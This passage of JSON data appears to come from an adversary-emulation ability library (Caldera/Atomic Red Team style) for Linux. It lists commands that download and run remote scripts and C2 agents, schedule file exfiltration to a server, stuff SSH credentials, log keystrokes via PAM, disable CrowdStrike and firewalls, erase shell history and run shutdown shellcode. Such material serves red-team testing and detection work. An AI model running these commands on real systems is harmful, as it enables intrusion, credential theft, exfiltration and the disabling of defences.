"linux", "requirements": ["scan.info"], "command": "./wifi.sh pref", "unlocks": ["wifi.network.ssid"]}, {"id": "6e1a53c0-7352-4899-be35-fa7f364d5722", "ability_name": "Print Working Directory", "description": "Print the current working directory on the system", "tactic": "discovery", "technique": "File and Directory Discovery", "platform": "linux", "requirements": [], "command": "pwd", "unlocks": []}, {"id": "453b8d81c6118310308fb5b22de12235", "ability_name": "Process Discovery - ps", "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n", "tactic": "discovery", "technique": "Process Discovery", "platform": "linux", "requirements": [], "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt", "unlocks": []}, {"id": "0e43a2cb76678e7dcaeb96646fa99c14", "ability_name": "Provide the SetUID capability to a file", "description": "This test gives a file the capability to set UID without using flags.\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Setuid and Setgid", "platform": "linux", "requirements": [], "command": "touch /tmp/evilBinary; sudo setcap cap_setuid=ep /tmp/evilBinary", "unlocks": []}, {"id": "1b2111f68be9d4b4d69413ee1b581c32", "ability_name": "Python pty module and spawn function used to spawn sh or bash", "description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Python", "platform": "linux", "requirements": [], "command": "which_python=$(which python || which python3 || which python2); $which_python -c \"import pty;pty.spawn('/bin/sh')\"; exit; $which_python -c \"import pty;pty.spawn('/bin/bash')\"; exit", "unlocks": []}, {"id": "f531571265dc24625b8799007cbeb1d5", "ability_name": "Python3 http.server", "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n", "tactic": "exfiltration", "technique": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "platform": "linux", "requirements": [], "command": "if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi", "unlocks": []}, {"id": "0ab383be-b819-41bf-91b9-1bd4404d83bf", "ability_name": "Ragdoll", "description": "A Python agent which communicates via the HTML contact", "tactic": "command-and-control", "technique": "Application Layer Protocol: Web Protocols", "platform": "linux", "requirements": [], "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}", "unlocks": []}, {"id": "b889d0e778b45382f11a30f8f011344a", "ability_name": "Reactivate a locked/expired account (Linux)", "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n", "tactic": "multiple", "technique": "Valid Accounts: Local Accounts", "platform": "linux", "requirements": [], "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art; usermod --lock art; usermod --expiredate \"1\" art; usermod --unlock art; usermod --expiredate \"99999\" art; su art; whoami; exit", "unlocks": []}, {"id": "02a5491f1c325b55303f34abb458b811", "ability_name": "Reboot Linux Host via Kernel System Request", "description": "reboot system via system request seen in Awfulshred wiper.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "echo 1> /proc/sys/kernel/sysrq ; echo b> /proc/sysrq-trigger", "unlocks": []}, {"id": "10971624ef3e693f52e8f526fdc26f5f", "ability_name": "Reboot System via `halt` - Linux", "description": "This test restarts a Linux system using `halt`.\n", "tactic": "impact", "technique": "System Shutdown/Reboot", "platform": "linux", "requirements": [], "command": "halt --reboot", "unlocks": []}, {"id": "e2a0dedb06b65b649f077c8e7e3f0d68", "ability_name": "Reboot System via `poweroff` - Linux", "description": "This test restarts a Linux system using `poweroff`.\n", "tactic": "impact", "technique": "System Shutdown/Reboot", "platform": "linux", "requirements": [], "command": "poweroff --reboot", "unlocks": []}, {"id": "ade7be51b815cbf8908ec931256374b6", "ability_name": "Remote System Discovery - arp nix", "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi;  ;  arp -a | grep -v '^?'", "unlocks": []}, {"id": "f489321f31b6ef36304294562d3d4645", "ability_name": "Remote System Discovery - ip neighbour", "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip neighbour show", "unlocks": []}, {"id": "3c73b47eb1df2065b8f45449b754c859", "ability_name": "Remote System Discovery - ip route", "description": "Use the ip route command to display the kernels routing tables. \n", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip route show", "unlocks": []}, {"id": "d29305a9be37f6892e33f7ee7c06b880", "ability_name": "Remote System Discovery - ip tcp_metrics", "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip tcp_metrics show |grep --invert-match \"^127\\.\"", "unlocks": []}, {"id": "1cac00896661be81f2dd242c94bb84be", "ability_name": "Remote System Discovery - sweep", "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": [], "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done", "unlocks": []}, {"id": "9c179dc2e0bea7b2340e92c574926fc2", "ability_name": "Restart System via `reboot` - macOS/Linux", "description": "This test restarts a macOS/Linux system via `reboot`.\n", "tactic": "impact", "technique": "System Shutdown/Reboot", "platform": "linux", "requirements": [], "command": "reboot", "unlocks": []}, {"id": "25bab84a1a63926a7cf7f56e4029ef15", "ability_name": "Restart System via `shutdown` - macOS/Linux", "description": "This test restarts a macOS/Linux system.\n", "tactic": "impact", "technique": "System Shutdown/Reboot", "platform": "linux", "requirements": [], "command": "shutdown -r now", "unlocks": []}, {"id": "a3fb0059bd5dea11d715cba0e09631d5", "ability_name": "SSH Credential Stuffing From Linux", "description": "Using username,password combination from a password dump to login over SSH.\n", "tactic": "credential-access", "technique": "Brute Force: Credential Stuffing", "platform": "linux", "requirements": [], "command": "cp 181475_credstuffuserpass.txt /tmp/; for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done", "unlocks": []}, {"id": "b52cfdbe25a4907867c8a7a4d639e471", "ability_name": "SSHD PAM keylogger", "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n", "tactic": "multiple", "technique": "Input Capture: Keylogging", "platform": "linux", "requirements": [], "command": "cp -v /etc/pam.d/sshd /tmp/; echo \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd; systemctl restart sshd; systemctl restart auditd; ssh ubuntu@localhost ; whoami; sudo su; whoami; exit; exit", "unlocks": []}, {"id": "740d52a409b9ec10c0eedc2cbe90614e", "ability_name": "SUDO Brute Force - Debian", "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n", "tactic": "credential-access", "technique": "Brute Force: Password Guessing", "platform": "linux", "requirements": ["sudo"], "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash", "unlocks": []}, {"id": "26c5328910ea05ace22e9795a45ca8b6", "ability_name": "SUDO Brute Force - Redhat", "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n", "tactic": "credential-access", "technique": "Brute Force: Password Guessing", "platform": "linux", "requirements": ["sudo"], "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash", "unlocks": []}, {"id": "2f34977d-9558-4c12-abad-349716777c6b", "ability_name": "Sandcat", "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -group red -v", "unlocks": []}, {"id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9", "ability_name": "Scan IP for ports", "description": "Use dropped scanner to find open popular ports", "tactic": "discovery", "technique": "Network Service Scanning", "platform": "linux", "requirements": [], "command": "python3 scanner.py -i #{remote.host.ip}", "unlocks": ["remote.host.ip"]}, {"id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "ability_name": "Scan WIFI networks", "description": "View all potential WIFI networks on host", "tactic": "discovery", "technique": "System Network Configuration Discovery", "platform": "linux", "requirements": ["no.logs", "fw.disabled"], "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan", "unlocks": ["scan.info"]}, {"id": "110cea7a-5b03-4443-92ee-7ccefaead451", "ability_name": "Scheduled Exfiltration", "description": "This ability exfiltrates the staged directory at a scheduled time.", "tactic": "exfiltration", "technique": "Scheduled Transfer", "platform": "linux", "requirements": [], "command": "crontab -l > /tmp/origcron;\ncrontab -l > /tmp/mycron;\necho \"0 12 * * * curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\" >> /tmp/mycron;\ncrontab /tmp/mycron;", "unlocks": []}, {"id": "7784d702d69cb5219ff8fa6177b3ad81", "ability_name": "Search Through Bash History", "description": "Search through bash history for specifice commands we want to capture\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Bash History", "platform": "linux", "requirements": [], "command": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt", "unlocks": []}, {"id": "61b75b3c87d87f8f1983ebf9c6e3f960", "ability_name": "Security Software Discovery - ps (Linux)", "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n", "tactic": "discovery", "technique": "Software Discovery: Security Software Discovery", "platform": "linux", "requirements": [], "command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'", "unlocks": []}, {"id": "13dee93f2cdf7f027718d0c517c60c8c", "ability_name": "Set a SetUID flag on file", "description": "This test sets the SetUID flag on a file in Linux and macOS.\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Setuid and Setgid", "platform": "linux", "requirements": [], "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod u+xs /tmp/evilBinary", "unlocks": []}, {"id": "5ffa5b3b330848d39dc1728365dad61c", "ability_name": "Set a file's creation timestamp", "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Timestomp", "platform": "linux", "requirements": [], "command": "NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date \"$NOW\"; stat /tmp/T1070.006-creation.txt", "unlocks": []}, {"id": "2801e38623f5a07972c9b2b0562ebc83", "ability_name": "Setting the HISTCONTROL environment variable", "description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n", "tactic": "defense-evasion", "technique": "Impair Defenses: HISTCONTROL", "platform": "linux", "requirements": [], "command": "TEST=$(echo $HISTCONTROL); if [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi; history -c ; ls -la $HISTFILE; if [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi; if [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi; history -c ; ls -la $HISTFILE; ls -la $HISTFILE; ls -la $HISTFILE; if [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi", "unlocks": []}, {"id": "6401e9fc7007569199a38703f0aa0f0f", "ability_name": "Setting the HISTFILE environment variable", "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: HISTCONTROL", "platform": "linux", "requirements": [], "command": "TEST=$(echo $HISTFILE); echo $HISTFILE; export HISTFILE=\"/dev/null\"; if [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi", "unlocks": []}, {"id": "844536fbe408f7127f6739462ca73668", "ability_name": "Setting the HISTFILESIZE environment variable", "description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: HISTCONTROL", "platform": "linux", "requirements": [], "command": "TEST=$(echo $HISTFILESIZE); echo $HISTFILESIZE; export HISTFILESIZE=0; if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; fi", "unlocks": []}, {"id": "f86efd3fbbde634b600d0c5bbd2bd2fe", "ability_name": "Setting the HISTIGNORE environment variable", "description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: HISTCONTROL", "platform": "linux", "requirements": [], "command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; ls -la $HISTFILE; ls -la ~/.bash_logout; if [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi; unset HISTIGNORE; if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; whoami; groups; if [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi", "unlocks": []}, {"id": "c214325cdad9e7f8099cea7c890d4156", "ability_name": "Shared Library Injection via /etc/ld.so.preload", "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n", "tactic": "multiple", "technique": "Hijack Execution Flow: LD_PRELOAD", "platform": "linux", "requirements": [], "command": "sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'", "unlocks": []}, {"id": "3d4732e94edec084f95224e4169c767d", "ability_name": "Shared Library Injection via LD_PRELOAD", "description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n", "tactic": "multiple", "technique": "Hijack Execution Flow: LD_PRELOAD", "platform": "linux", "requirements": [], "command": "LD_PRELOAD=/tmp/T1574006.so ls", "unlocks": []}, {"id": "c93306256db4e763315631b158c37d78", "ability_name": "Show if a user account has ever logged in remotely", "description": "Show if a user account has ever logged in remotely\n", "tactic": "discovery", "technique": "Account Discovery: Local Account", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v lastlog)\" ]; then : ; else sudo apt-get install login; exit 1;; fi;  ;  lastlog > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt", "unlocks": []}, {"id": "991b57c6ea9ab986d904928e57c5163a", "ability_name": "Shutdown System via `halt` - Linux", "description": "This test shuts down a Linux system using `halt`.\n", "tactic": "impact", "technique": "System Shutdown/Reboot", "platform": "linux", "requirements": [], "command": "halt -p", "unlocks": []}, {"id": "c17af196907f72450ed545de754fee45", "ability_name": "Shutdown System via `poweroff` - Linux", "description": "This test shuts down a Linux system using `poweroff`.\n", "tactic": "impact", "technique": "System Shutdown/Reboot", "platform": "linux", "requirements": [], "command": "poweroff", "unlocks": []}, {"id": "e7defb71a411a050c650ab0901520109", "ability_name": "Shutdown System via `shutdown` - macOS/Linux", "description": "This test shuts down a macOS/Linux system using a halt.\n", "tactic": "impact", "technique": "System Shutdown/Reboot", "platform": "linux", "requirements": [], "command": "shutdown -h now", "unlocks": []}, {"id": "0821b0b0-7902-4a7b-8052-80bda5a43684", "ability_name": "Shutdown Target System", "description": "Force shutdown a target system using Process Injection and raw shellcode", "tactic": "impact", "technique": "Endpoint Denial of Service", "platform": "linux", "requirements": [], "command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05", "unlocks": []}, {"id": "1d3d67824a72ebdf9811b3bbcec481a0", "ability_name": "Space After Filename", "description": "Space after filename.\n", "tactic": "defense-evasion", "technique": "Masquerading: Space after Filename", "platform": "linux", "requirements": [], "command": "mkdir -p /tmp/atomic-test-T1036.006; cd /tmp/atomic-test-T1036.006; mkdir -p 'testdirwithspaceend '; /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null; chmod +x 'testdirwithspaceend /init '; './testdirwithspaceend /init '", "unlocks": []}, {"id": "f16438a836c9c466cc3d56cb0262fe3f", "ability_name": "Stage data from Discovery.sh", "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n", "tactic": "collection", "technique": "Data Staged: Local Data Staging", "platform": "linux", "requirements": [], "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log", "unlocks": []}, {"id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "ability_name": "Stage sensitive files", "description": "copy files to staging directory", "tactic": "collection", "technique": "Data Staged: Local Data Staging", "platform": "linux", "requirements": ["host.dir.staged"], "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "unlocks": ["sensitive.files"]}, {"id": "a394a5f9-8cd4-4a1b-b6b8-893b214c70cb", "ability_name": "Stage sensitive files ", "description": "copy files to staging directory", "tactic": "collection", "technique": "Data Staged: Local Data Staging", "platform": "linux", "requirements": ["host.dir.staged"], "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "unlocks": ["sensitive.files"]}, {"id": "7eeb1fbc-ee8a-4d55-b372-823f38a7757a", "ability_name": "Stage sensitive files ", "description": "copy files to staging directory", "tactic": "collection", "technique": "Data Staged: Local Data Staging", "platform": "linux", "requirements": ["host.dir.staged"], "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}", "unlocks": ["sensitive.files"]}, {"id": "b1d41972-3ad9-4aa1-8f7f-05f049a2980e", "ability_name": "Start 54ndc47", "description": "Start a new 54ndc47 agent in background", "tactic": "execution", "technique": "Command and Scripting Interpreter: Unix Shell", "platform": "linux", "requirements": [], "command": "nohup ./sandcat.go -server #{server} &", "unlocks": []}, {"id": "10a9d979-e342-418a-a9b0-002c483e0fa6", "ability_name": "Start 54ndc47", "description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication", "tactic": "lateral-movement", "technique": "Remote Services: SSH", "platform": "linux", "requirements": [], "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "unlocks": []}, {"id": "bc55c3967731490dc44e0f05b55b250d", "ability_name": "Stop Crowdstrike Falcon on Linux", "description": "Stop and disable Crowdstrike Falcon on Linux\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "sudo systemctl stop falcon-sensor.service; sudo systemctl disable falcon-sensor.service", "unlocks": []}, {"id": "8478297ebb155b34c412a0fde335eccd", "ability_name": "Stop/Start UFW firewall", "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": ["root"], "command": "ufw disable", "unlocks": ["fw.disabled"]}, {"id": "da03142f3c859db6a08d57accc7d2aa8", "ability_name": "Stop/Start UFW firewall systemctl", "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": ["root"], "command": "systemctl stop ufw", "unlocks": ["fw.disabled"]}, {"id": "dd1eadab4aa421d3a0048c3c85bf60e3", "ability_name": "Sudo usage", "description": "Common Sudo enumeration methods.\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "platform": "linux", "requirements": ["sudo"], "command": "sudo -l      ; sudo cat /etc/sudoers; sudo vim /etc/sudoers", "unlocks": []}, {"id": "69ac4d0ed190b9442fca7e16f649a2be", "ability_name": "Suspend History", "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": [], "command": "set +o history", "unlocks": []}, {"id": "334d0a8f48017677533913505003a8fc", "ability_name": "System Network Configuration Discovery", "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n", "tactic": "discovery", "technique": "System Network Configuration Discovery", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools); fi;  ;  if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;", "unlocks": []}, {"id": "c668e2597e8c0ebf1709f85d253995ab", "ability_name": "System Network Connections Discovery Linux & MacOS", "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n", "tactic": "discovery", "technique": "System Network Connections Discovery", "platform": "linux", "requirements": [], "command": "netstat; who -a", "unlocks": []}, {"id": "4370001012f5f0df001269627b4737e9", "ability_name": "System Owner/User Discovery", "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n", "tactic": "discovery", "technique": "System Owner/User Discovery", "platform": "linux", "requirements": [], "command": "users; w; who", "unlocks": []}, {"id": "4f4b640f1cc25b1ecc03690327517411", "ability_name": "System Service Discovery - systemctl", "description": "Enumerates system service using systemctl\n", "tactic": "discovery", "technique": "System Service Discovery", "platform": "linux", "requirements": [], "command": "systemctl --type=service", "unlocks": []}, {"id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65", "ability_name": "System processes", "description": "Identify system processes", "tactic": "discovery", "technique": "Process Discovery", "platform": "linux", "requirements": ["fw.disabled", "no.logs"], "command": "ps aux", "unlocks": ["scan.info"]}, {"id": "0739c2e7c60bf7703b36a4f8f3480ccc", "ability_name": "System shell profile scripts", "description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n", "tactic": "multiple", "technique": "Event Triggered Execution: .bash_profile and .bashrc", "platform": "linux", "requirements": [], "command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh", "unlocks": []}, {"id": "57c937f19b6539e983cb807ad74e9cd8", "ability_name": "Tail the UFW firewall log file", "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": [], "command": "tail /var/log/ufw.log", "unlocks": []}, {"id": "6caef6484ad6ecb32eb311c6cd8b7ca6", "ability_name": "Testing usage of uncommonly used port", "description": "Testing uncommonly used port utilizing telnet.\n", "tactic": "command-and-control", "technique": "Non-Standard Port", "platform": "linux", "requirements": [], "command": "telnet google.com 8081", "unlocks": []}, {"id": "a17ba4dfbcf9117ba3fcb935ff91f49c", "ability_name": "Tor Proxy Usage - Debian/Ubuntu", "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n", "tactic": "command-and-control", "technique": "Proxy: Multi-hop Proxy", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v tor --version)\" ]; then : ; else sudo apt-get -y install tor; fi;  ;  sudo systemctl start tor", "unlocks": []}, {"id": "ba0deadb-97ac-4a4c-aa81-21912fc90980", "ability_name": "Transfer Compressed Archive to Separate S3 Bucket via AWS CLI", "description": "Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper\npolicies and security rules are in place to allow reading from the source bucket and writing to the destination\nbucket.\n", "tactic": "exfiltration", "technique": "Transfer Data to Cloud Account", "platform": "linux", "requirements": ["host.dir.compress"], "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;", "unlocks": []}, {"id": "7e2dc6c4605119184437dbc8cdb80265", "ability_name": "Trap EXIT", "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "tactic": "multiple", "technique": "Event Triggered Execution: Trap", "platform": "linux", "requirements": [], "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" 